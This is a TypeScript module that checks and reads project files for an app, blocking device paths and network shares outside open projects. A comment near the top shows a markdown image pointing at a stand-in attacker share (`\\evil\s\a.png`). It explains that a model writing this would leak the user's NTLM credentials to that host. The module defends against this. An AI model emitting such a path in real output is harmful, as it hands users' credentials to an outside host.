import { open, readdir, realpath, stat } from "node:fs/promises";
import { isAbsolute, join, win32 } from "node:path";
import type { FileContents, FileEntry } from "@plume/contract";
import { isRemoteOrDevicePath } from "../../shared/remote-path.ts";
import { resolveInside } from "./file-ops.ts";

/** Enough for source and text files without pulling generated output into a renderer. */
const FILE_READ_CAP = 512 * 1024;

/**
 * Whether a path on another machine may be touched at all — decided by the letter, before any IO.
 *
 * `realpath` below is already IO: on Windows, resolving `\\host\share\a.png` connects to that host
 * and offers it the user's NTLM credentials, so a model writing `![](\\evil\s\a.png)` would leak
 * them before the containment check ever ran. A share is allowed only when an open project itself
 * lives on it; device paths (`\\?\`, `\\.\`) never are. Win32 semantics on every platform, so the
 * rule is the same one the tests see on macOS.
 */
export function remotePathAllowed(target: string, roots: readonly string[]): boolean {
	if (!isRemoteOrDevicePath(target)) return true;
	if (isDevicePath(target)) return false;
	const full = win32.resolve(target);
	return roots.some((root) => {
		if (!isRemoteOrDevicePath(root) || isDevicePath(root)) return false;
		const rel = win32.relative(win32.resolve(root), full);
		return rel === "" || (rel !== ".." && !rel.startsWith("..\\") && !win32.isAbsolute(rel));
	});
}

const isDevicePath = (path: string) => /^[\\/]{2}[?.][\\/]/.test(path);

/** Resolve both sides before IO so project symlinks cannot grant access to files outside it. */
export async function resolveReadablePath(target: string, roots: readonly string[]): Promise<string | null> {
	if (!isAbsolute(target)) return null;
	if (!remotePathAllowed(target, roots)) return null;
	// Listings return canonical paths, so later clicks must compare against canonical roots too.
	const [resolved, realRoots] = await Promise.all([
		realpath(target).catch(() => null),
		Promise.all(roots.filter((root) => isAbsolute(root)).map((root) => realpath(root).catch(() => null))),
	]);
	if (!resolved) return null;
	return resolveInside(resolved, realRoots.filter((root) => root !== null));
}

/** List one already-authorised directory. Path authorisation stays at the calling boundary. */
export async function listReadableFiles(dir: string | null): Promise<FileEntry[]> {
	if (!dir) return [];
	const entries = await readdir(dir, { withFileTypes: true }).catch(() => []);
	const out = await Promise.all(
		entries.map(async (entry) => {
			const path = join(dir, entry.name);
			const info = entry.isDirectory() ? null : await stat(path).catch(() => null);
			return { name: entry.name, path, isDirectory: entry.isDirectory(), size: info?.size ?? 0 };
		}),
	);
	return out.sort((a, b) =>
		a.isDirectory === b.isDirectory ? a.name.localeCompare(b.name, undefined, { sensitivity: "base" }) : a.isDirectory ? -1 : 1,
	);
}

/** Read one already-authorised text file, with a fixed cap. */
export async function readReadableFile(path: string | null, readOnly: boolean): Promise<FileContents | null> {
	if (!path) return null;
	const info = await stat(path).catch(() => null);
	if (!info?.isFile()) return null;

	/*
	 * Only the part that will be shown is read. The whole file used to be read and then clipped, so
	 * opening a multi-gigabyte log in the panel pulled all of it into the main process first.
	 */
	const buffer = await readHead(path, FILE_READ_CAP);
	if (!buffer) return null;
	const head = buffer.subarray(0, 8000);
	if (head.includes(0)) {
		return { text: "", readOnly, truncated: false, bytes: info.size, binary: true, modifiedAt: info.mtimeMs };
	}

	return {
		text: buffer.toString("utf8"),
		readOnly,
		truncated: info.size > FILE_READ_CAP,
		bytes: info.size,
		modifiedAt: info.mtimeMs,
	};
}

/** The first `limit` bytes of a file, or null when it cannot be opened. */
async function readHead(path: string, limit: number): Promise<Buffer | null> {
	const handle = await open(path, "r").catch(() => null);
	if (!handle) return null;
	try {
		const buffer = Buffer.allocUnsafe(limit);
		// One `read` may come back short (network filesystems do), so keep going until EOF or the cap.
		let filled = 0;
		while (filled < limit) {
			const { bytesRead } = await handle.read(buffer, filled, limit - filled, filled);
			if (bytesRead === 0) break;
			filled += bytesRead;
		}
		return buffer.subarray(0, filled);
	} catch {
		return null;
	} finally {
		await handle.close().catch(() => {});
	}
}
